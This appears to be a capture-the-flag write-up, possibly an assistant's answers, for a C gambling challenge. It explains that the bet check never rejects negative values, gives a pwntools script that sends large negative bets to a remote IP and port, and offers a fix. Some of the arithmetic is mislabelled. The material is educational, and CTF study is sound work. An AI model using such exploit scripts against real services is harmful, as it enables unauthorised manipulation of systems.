# Killionaire
This challenge is a classic "Integer Overflow" or "Signedness" bug disguised as a gambling game. Let's break down the vulnerability and the solution.

### **The Vulnerability**

In the C code, the check for your bet is:

**C**

`if (bet > coins) {
    printf("Invalid bet.\n");
    continue;
}`

While `coins` is an `int` (initialized to 1), the variable `bet` is also a **signed integer** (from `scanf("%d", &bet)`). In signed integer logic, **any negative number is less than 1**.

If you enter a very large negative number:

1. The check `bet > coins` will be **false** (e.g., -2000000000 is definitely less than 1).
2. If you "lose" (the `else` case), the code does: `coins -= bet;`.
3. Subtracting a negative is the same as adding a positive: `1 - (-2000000000) = 2000000001`.
4. The `coins >= 1000` check will trigger immediately, and you get the flag.

### **The Exploit Strategy**

We need to send a negative number that is large enough to put our `coins` over 1000, but we also need to account for the 50/50 chance of "winning" or "losing."

- If we **lose** with a negative bet, we gain coins.
- If we **win** with a negative bet, the calculation `(bet * (rand() % 301)) / 100` will likely result in a negative gain (subtracting coins).

To be safe, we can just keep sending a large negative number like `-2000000000` until the "FAILURE" (subtraction) logic hits.

### **The Python Solution**

We will use `pwntools`, which is the standard library for CTF exploit scripts.

**Python**

`from pwn import *

# Connection details
HOST = '133.88.122.244'
PORT = 30757

def solve():
    # Start the connection
    io = remote(HOST, PORT)

    # We have 10 rounds, we only need to hit the "else" branch once
    # with a large negative number.
    negative_bet = "-2000000000"

    try:
        for i in range(10):
            # Wait until the program asks for the bet
            io.recvuntil(b"Bet: ")
            
            log.info(f"Round {i+1}: Sending negative bet {negative_bet}")
            io.sendline(negative_bet.encode())

            # Read the result of the round
            result = io.recvline().decode()
            print(result.strip())

            # If we see "Flag:", we won!
            if "Flag:" in result:
                # Sometimes the flag is on the same line or the next
                remaining = io.recvall(timeout=2).decode()
                print(remaining)
                break
            
            # Check if we hit SUCCESS (which means we lost coins because bet was negative)
            # or FAILURE (which means we gained coins)
            if "SUCCESS" in result:
                log.warning("Unlucky! The rand() made us 'win', losing coins. Trying next round...")
            elif "FAILURE" in result:
                log.success("Hit the subtraction logic! Checking for flag...")
                # The flag should be printed now if coins > 1000
                flag_line = io.recvall(timeout=2).decode()
                print(flag_line)
                break

    except EOFError:
        log.error("Connection closed.")
    finally:
        io.close()

if __name__ == "__main__":
    solve()`

### **Why this works**

In computer memory, integers are stored in two's complement. By providing a negative number, you bypass the "maximum bet" check. The logic `coins -= bet` becomes `coins = coins - (-value)`, which is addition. Since your goal is only 1000, any negative number smaller than -1000 will satisfy the condition `coins >= 1000` as soon as you "lose" a round.

# 

# 

why specifically -200000000 and how do you know that this is the bug? where in the code?

# 

The bug in this code is a classic **Signed Integer Comparison** error. To understand why this happens and why a large negative number works, we have to look at how C handles types and memory.

### **1. Where exactly is the bug?**

The vulnerability is located in the comparison check within `main()`:

**C**

`int bet; // 'bet' is a signed integer
...
if (bet > coins) { // The Comparison Bug
    printf("Invalid bet.\n");
    continue;
}`

In C, a signed `int` can hold both positive and negative values. The logic assumes the user will only enter positive numbers, but it **never checks if `bet` is less than zero**.

- If `coins = 1` and you enter `bet = 5`, then `5 > 1` is **true** (Invalid).
- If you enter `bet = -2000000000`, then `2000000000 > 1` is **false**.

Because the "Invalid bet" check fails, the program proceeds to the gambling logic with a massive negative number.

---

### **2. Why specifically -2000000000?**

Technically, any negative number smaller than **-1000** would work for this specific challenge, but we use a large value like `-2,000,000,000` to be "safe" for a few reasons:

- **The Goal:** You need `coins >= 1000`. If you start with `1` coin and "lose" a bet of `2,000,000,000`, the math becomes:
    
    1−(−2,000,000,000)=2,000,000,001
    
    This immediately puts you way over the 1,000-coin requirement.
    
- **Integer Limits:** A 32-bit signed integer has a minimum value of −2,147,483,648. `2,000,000,000` is close to that limit but safe enough that it won't overflow into a positive number during the subtraction.

---

### **3. How the "Loss" becomes a "Win"**

Look at the logic for when you "fail" the round:

**C**

`} else {
    coins -= bet; // The Arithmetic Bug
    printf("Result: FAILURE (Lost: %d)\n", bet);
}`

In mathematics, subtracting a negative is addition. When the program executes `coins -= bet`, it is essentially performing `coins = coins + abs(bet)`.

The program prints "FAILURE" because it thinks it took your money, but because the money was a negative debt, it actually added to your balance.

---

### **4. Spotting it in the Assembly (Disassembly)**

If you look at the `gdb` output you provided, you can see the exact instructions where this happens:

- **The Comparison:**`0x000000000000143a <+270>: cmp %eax,-0x14(%rbp)0x000000000000143d <+273>: jge 0x1453 <main+295>jge` stands for **Jump if Greater or Equal**. This is a **signed** jump instruction. If the CPU sees a negative bit set in your input, it treats the value as mathematically smaller than the `coins` variable.
- **The Subtraction:**`0x00000000000014cb <+415>: sub %eax,-0x14(%rbp)`
This is where the subtraction happens. The CPU doesn't care if the number is "meant" to be positive or negative; it just performs the binary subtraction, which results in a larger positive number for your coin balance.

### **How to avoid this in real code?**

To fix this, a programmer should use `unsigned int` for currency or add a check to ensure the bet is not negative:
`if (bet > coins || bet < 0)`
